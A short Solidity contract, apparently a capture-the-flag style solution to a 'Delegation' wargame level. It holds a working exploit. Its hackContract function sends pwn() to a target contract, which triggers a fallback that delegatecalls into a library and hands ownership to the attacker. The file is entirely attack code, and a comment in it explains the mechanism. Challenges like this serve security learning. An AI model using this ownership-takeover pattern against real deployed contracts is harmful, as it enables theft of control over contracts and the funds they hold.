// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";
import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        //Calling a function not present in the contract activates fallback function and sends msg.data to delegation.
        payable(contractAddress).call(abi.encodeWithSignature("pwn()"));
    }
} 
